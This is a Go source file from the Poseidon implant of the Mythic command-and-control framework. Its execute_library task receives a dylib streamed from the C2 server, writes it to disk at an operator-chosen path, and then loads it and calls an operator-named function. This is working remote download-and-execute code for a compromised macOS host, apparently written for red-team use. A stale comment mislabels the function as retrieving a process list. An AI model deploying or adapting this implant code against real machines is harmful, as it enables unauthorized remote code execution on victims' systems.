package execute_library

import (
	// Standard
	"encoding/json"
	"fmt"
	"os"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type executeLibraryArgs struct {
	FileID       string   `json:"file_id"`
	FilePath     string   `json:"file_path"`
	FunctionName string   `json:"function_name"`
	Args         []string `json:"args"`
}

// Run - interface method that retrieves a process list
func Run(task structs.Task) {
	msg := task.NewResponse()

	args := executeLibraryArgs{}

	err := json.Unmarshal([]byte(task.Params), &args)
	if err != nil {
		msg.SetError(fmt.Sprintf("Failed to unmarshal parameters: %s", err.Error()))
		task.Job.SendResponses <- msg
		return
	}
	if args.FileID != "" {
		if args.FilePath == "" {
			msg.SetError(fmt.Sprintf("When supplying a file, must specify a path to write the dylib to"))
			task.Job.SendResponses <- msg
			return
		}
		r := structs.GetFileFromMythicStruct{}
		r.FileID = args.FileID
		r.FullPath = ""
		r.Task = &task
		r.ReceivedChunkChannel = make(chan []byte)
		task.Job.GetFileFromMythic <- r

		fileBytes := make([]byte, 0)

		for {
			newBytes := <-r.ReceivedChunkChannel
			if len(newBytes) == 0 {
				break
			} else {
				fileBytes = append(fileBytes, newBytes...)
			}
		}
		if len(fileBytes) == 0 {
			msg.SetError(fmt.Sprintf("Failed to get file"))
			task.Job.SendResponses <- msg
			return
		}
		file, err := os.Create(args.FilePath)
		if err != nil {
			msg.SetError(err.Error())
			task.Job.SendResponses <- msg
			return
		}
		_, err = file.Write(fileBytes)
		if err != nil {
			msg.SetError(err.Error())
			task.Job.SendResponses <- msg
			return
		}
	}
	resp, _ := executeLibrary(args.FilePath, args.FunctionName, args.Args)
	msg.Completed = true
	msg.UserOutput = resp.Message
	task.Job.SendResponses <- msg
	return
}
